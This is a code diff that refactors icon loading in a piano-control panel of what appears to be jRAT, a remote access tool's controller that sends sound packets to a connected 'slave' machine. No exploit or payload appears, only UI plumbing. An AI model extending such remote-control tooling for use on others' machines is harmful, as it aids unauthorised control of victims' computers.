@@ -11,7 +11,6 @@ import javax.sound.sampled.SourceDataLine;
 import javax.swing.BorderFactory;
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
-import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JCheckBox;
 import javax.swing.JLabel;
@@ -25,6 +24,7 @@ import se.jrat.client.Piano;
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet66PianoNote;
 import se.jrat.client.packets.outgoing.Packet67LongPianoNote;
+import se.jrat.client.utils.IconUtils;
 
 
 @SuppressWarnings("serial")
@@ -206,7 +206,7 @@ public class PanelControlPiano extends PanelControlParent {
 				slave.addToSendQueue(new Packet67LongPianoNote((Integer) spinnerSound.getValue(), (Integer) spinnerSec.getValue()));
 			}
 		});
-		btnSend.setIcon(new ImageIcon(PanelControlPiano.class.getResource("/icons/right.png")));
+		btnSend.setIcon(IconUtils.getIcon("right"));
 
 		JButton btnTest = new JButton("Test");
 		btnTest.addActionListener(new ActionListener() {
@@ -224,7 +224,7 @@ public class PanelControlPiano extends PanelControlParent {
 				}
 			}
 		});
-		btnTest.setIcon(new ImageIcon(PanelControlPiano.class.getResource("/icons/sound.png")));
+		btnTest.setIcon(IconUtils.getIcon("sound"));
 		GroupLayout gl_panel_1 = new GroupLayout(panel_1);
 		gl_panel_1.setHorizontalGroup(gl_panel_1.createParallelGroup(Alignment.LEADING).addGroup(gl_panel_1.createSequentialGroup().addContainerGap().addComponent(lblSound).addPreferredGap(ComponentPlacement.RELATED).addComponent(spinnerSound, GroupLayout.PREFERRED_SIZE, 61, GroupLayout.PREFERRED_SIZE).addGap(18).addComponent(lblSeconds).addPreferredGap(ComponentPlacement.RELATED).addComponent(spinnerSec, GroupLayout.PREFERRED_SIZE, 68, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, 22, Short.MAX_VALUE).addComponent(btnTest).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnSend).addContainerGap()));
 		gl_panel_1.setVerticalGroup(gl_panel_1.createParallelGroup(Alignment.LEADING).addGroup(gl_panel_1.createSequentialGroup().addContainerGap().addGroup(gl_panel_1.createParallelGroup(Alignment.BASELINE).addComponent(lblSound).addComponent(spinnerSound, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblSeconds).addComponent(spinnerSec, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addContainerGap(29, Short.MAX_VALUE)).addGroup(Alignment.TRAILING, gl_panel_1.createSequentialGroup().addContainerGap(26, Short.MAX_VALUE).addGroup(gl_panel_1.createParallelGroup(Alignment.BASELINE).addComponent(btnSend).addComponent(btnTest)).addContainerGap()));
